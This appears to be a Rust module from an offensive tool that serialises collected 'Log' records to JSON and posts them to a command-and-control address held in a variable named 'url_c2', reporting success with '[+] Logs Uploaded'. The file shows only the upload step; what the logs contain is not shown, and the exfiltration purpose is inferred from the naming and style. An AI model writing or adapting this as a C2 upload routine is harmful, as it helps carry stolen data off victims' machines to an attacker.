use crate::Log;

use reqwest::Client;

async fn send_logs(logs: &Vec<Log>, url_c2: String, _public_key: String) {
    match serde_json::to_string(logs) {
        Ok(json) => {
            let client = Client::new();
            
            match client
                .post(&url_c2)
                .header("Content-Type", "application/json")
                .body(json)
                .send()
                .await
            {
                Ok(response) => {
                    if response.status().is_success() {
                        println!("[+] Logs Uploaded");
                    } else {
                        eprintln!("\n[-] Error status: {}\n[-] Error text: {:?}", response.status(), response);
                    }
                }
                Err(e) => {
                    println!("\n[-] Failed to upload logs into {}\n[-] Error: {}", url_c2, e);
                }
            }
        }
        Err(e) => {
            eprintln!("\n[-] Error json: {}", e);
        }
    }
}

#[tokio::main]
pub async fn send(logs: &Vec<Log>, url_c2: String, public_key: String) {
    send_logs(logs, url_c2, public_key).await
}